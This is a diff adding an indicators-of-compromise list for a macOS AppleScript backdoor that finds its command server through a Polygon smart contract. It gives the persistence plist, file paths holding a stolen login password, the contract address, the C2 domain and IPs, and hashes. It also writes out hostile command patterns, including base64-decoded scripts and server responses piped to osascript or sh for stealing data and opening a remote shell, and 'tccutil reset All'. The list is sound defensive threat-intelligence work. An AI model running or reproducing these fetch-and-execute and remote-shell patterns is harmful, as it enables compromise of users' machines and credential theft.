@@ -1,0 +1,35 @@
+# Indicators of Compromise - macOS EtherHiding AppleScript backdoor (round 2)
+
+## Persistence
+~/Library/LaunchAgents/com.qxgpjsivitldyooj.plist   (Label com.qxgpjsivitldyooj, RunAtLoad+KeepAlive, /bin/bash -c "echo <b64> | base64 -d | osascript")
+sha256 a582c3e08c569efba47d74bfaddb3dcb32bcc46d4b591098db237370a91f50b2
+
+## Host artifacts
+~/.passphrase   (victim's macOS login password in cleartext, written by backdoor after dscl . authonly validation)
+~/.txid         (bot id: d50f29d4d180318d6c36afa9a59b0514)
+
+## Dead-drop resolver (EtherHiding)
+Polygon smart contract : 0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0
+Function selector      : 0x2686ecea   (eth_call, returns C2 hostname as ABI string)
+Public RPCs abused     : polygon.drpc.org, polygon.publicnode.com, polygon-mainnet.gateway.tatum.io, tenderly.rpc.polygon.community
+
+## C2 (resolved 2026-09-11)
+Domain : jse8x92s.me
+IPs    : 172.67.204.237, 104.21.52.225  (Cloudflare-fronted)
+Paths  : POST / -d "check"                      -> "success"
+         POST / -d "txid=<id>&bmodule"          -> stage2 backdoor (AppleScript)
+         POST / -d "uuid=&username=&txid=&connect" -> "newconnect"/"connected"
+         POST / -d "uuid=&username=&txid=&task"    -> notasks | runloader | runlight | replacer | openshell
+         POST / -d "txid=<id>&smodule" | osascript  (stealer)
+         POST / -d "txid=<id>&lmodule" | osascript  (light module)
+         POST / -d "uuid=&username=&txid=&shell" | sh (remote shell)
+
+## Samples
+stage2 bmodule sha256 4c4ab157c3bf267273d943521ea41a7798781d675c986ede0d2c687a1c1223a1
+
+## Behavioural
+- dscl . authonly <user> <pw>   (password validation loop with fake dialog
+  "To run the application you need to change the settings for its operation...")
+- tccutil reset All             (wipes all TCC privacy grants on first check-in)
+- ioreg -rd1 -c IOPlatformExpertDevice (IOPlatformUUID as bot id)
+- nohup sh -c "curl ... | osascript" &
